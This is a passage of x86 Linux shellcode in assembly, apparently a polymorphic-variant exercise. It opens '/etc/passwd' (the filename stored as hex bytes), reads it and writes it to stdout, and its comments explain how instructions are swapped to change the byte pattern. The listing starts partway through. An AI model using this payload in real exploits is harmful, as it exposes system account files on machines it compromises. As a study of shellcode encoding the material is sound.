;mov eax, 0x5
push 0x5
pop eax

pop ebx         ; <addr> 0x3D (filename from stack) 

;xor ecx,ecx     ; replace xor instructions
sub ecx,ecx
int 0x80        ; call open() 

; mov ebx,eax 
xchg ebx,eax     ; ebx now holds file descriptor

mov eax,0x3     ; read()
                ; man 2 read
                ; ssize_t read(int fd, void *buf, size_t count);
mov edi,esp     
mov ecx,edi     ; ptr to stack : returned file content will fill this buffer
mov edx,0x1000  ; buf = 4096
int 0x80        ; call read()

mov edx,eax     ; edx holds number of bytes returned from read()
mov eax,0x4     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 4$"
                ; write()
                ; man 2 write
                ; ssize_t write(int fd, const void *buf, size_t count);
mov ebx,0x1     ; 1 = stdout (where to write output)
int 0x80        ; call write() 
                ; NOTE: ecx still points to stack (buffer to write)

mov eax,0x1     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 1$"
                ; man exit
                ; void exit(int status);
mov ebx,0x0     ; status = 0 = EXIT_SUCCESS
int 0x80        ; call exit()

jump1:
call 0x2    ; jump to main
            ; address of 0x3D pushed to top of stack
2F6574632F70617373776400      ; (ascii) /passwd